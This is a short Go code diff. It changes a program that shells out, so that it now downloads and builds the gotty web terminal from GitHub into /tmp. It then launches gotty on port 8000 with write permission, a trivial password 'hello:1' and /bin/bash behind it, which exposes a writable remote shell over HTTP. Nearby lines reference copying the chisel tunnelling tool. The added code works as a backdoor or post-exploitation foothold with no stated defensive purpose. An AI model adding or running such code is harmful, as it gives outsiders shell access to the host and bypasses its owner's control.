@@ -19,7 +19,7 @@ func main() {
         return
     }
     log.Printf("current dir %s\n", current_dir)
-    cmd = exec.Command("/bin/sh", "-c", "ls -al ../")
+    cmd = exec.Command("/bin/sh", "-c", "GOPATH=/tmp/gotty go get github.com/yudai/gotty")
     stdoutStderr, err = cmd.CombinedOutput()
 	if err != nil {
         log.Println(string(stdoutStderr))
@@ -27,7 +27,15 @@ func main() {
         return
 	}
     log.Println(string(stdoutStderr))
-
+    cmd = exec.Command("/bin/sh", "-c", "/tmp/gotty/bin/gotty --port 8000 --permit-write --reconnect --credential hello:1 /bin/bash")
+    stdoutStderr, err = cmd.CombinedOutput()
+	if err != nil {
+        log.Println(string(stdoutStderr))
+		log.Printf("run shell ls return error %v\n", err)
+        return
+	}
+    log.Println(string(stdoutStderr))
+    return
     cmd = exec.Command("/bin/sh", "-c", "cp ../chisel .")
     stdoutStderr, err = cmd.CombinedOutput()
     if err != nil {
